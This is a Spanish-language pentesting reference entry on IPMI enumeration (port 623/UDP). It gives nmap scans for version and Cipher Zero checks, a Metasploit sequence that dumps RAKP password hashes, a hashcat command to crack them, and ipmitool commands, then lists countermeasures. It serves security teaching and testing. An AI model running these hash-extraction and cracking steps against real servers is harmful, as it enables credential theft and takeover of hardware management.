# Enumeración IPMI (Intelligent Platform Management Interface) (Puerto 623/UDP)

## Descripción
IPMI es un conjunto de especificaciones de interfaz para subsistemas informáticos autónomos que permiten la gestión remota del hardware (encendido, apagado, monitorización) independientemente del sistema operativo. Se ejecuta típicamente en un Baseboard Management Controller (BMC). La enumeración de IPMI permite descubrir versiones del protocolo, configuraciones inseguras (como Cipher Zero) y extraer hashes de usuarios locales que pueden ser crackeados offline.

## Clasificación
- **Fase**: Enumeración
- **MITRE ATT&CK**: T1046 (Network Service Discovery)
- **Plataforma**: Multi
- **Dificultad**: Intermedia

## Herramientas
- **ipmitool** — herramienta de línea de comandos para gestionar y configurar dispositivos IPMI
- **nmap** — scripts NSE (ipmi-version, ipmi-cipher-zero)
- **Metasploit** — módulos auxiliares para escaneo, detección de Cipher Zero y extracción de hashes (RAKP)
- **hashcat** — para crackear los hashes de contraseñas obtenidos (RAKP)

## Comandos / Ejemplos

### Escaneo inicial con Nmap
```bash
# Detectar si IPMI está activo y obtener versión
nmap -sU -p 623 --script ipmi-version 10.10.10.10

# Verificar vulnerabilidad Cipher Zero (permite bypass de autenticación en ciertas versiones)
nmap -sU -p 623 --script ipmi-cipher-zero 10.10.10.10
```

### Extracción de hashes RAKP con Metasploit
Esta técnica aprovecha el protocolo de autenticación RAKP para solicitar el hash de la contraseña de un usuario conocido (o mediante fuerza bruta de nombres de usuario).
```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
run
```

### Crackeo de hashes RAKP con Hashcat
```bash
# Formato hashcat para IPMI 2.0 RAKP HMAC-SHA1
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Interacción con ipmitool (Si se tienen credenciales)
```bash
# Obtener información del chasis
ipmitool -I lanplus -H 10.10.10.10 -U root -P password chassis status

# Listar usuarios configurados
ipmitool -I lanplus -H 10.10.10.10 -U root -P password user list
```

## Contramedidas
- **Aislar la red de gestión** (IPMI/BMC) en una VLAN dedicada y restringida (out-of-band management).
- **Deshabilitar IPMI sobre LAN** si no es estrictamente necesario para la gestión remota.
- **Utilizar contraseñas extremadamente robustas** para las cuentas del BMC (especialmente la cuenta 'admin' o 'root').
- **Actualizar el firmware del BMC** regularmente para parchear vulnerabilidades conocidas en el protocolo y el software de gestión.
- **Implementar listas de control de acceso (ACLs)** basadas en IP para restringir quién puede interactuar con el puerto 623/UDP.

## Referencias
- IPMI Specification v2.0. (2024). Intel Corporation. https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html
- HackTricks. (2024). 623 - Pentesting IPMI. https://book.hacktricks.xyz/network-services-pentesting/623-udp-pentesting-ipmi
- Rapid7. (2024). IPMI Scanning and Exploitation. https://docs.metasploit.com/docs/pentesting/metasploit-guide-ipmi.html
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
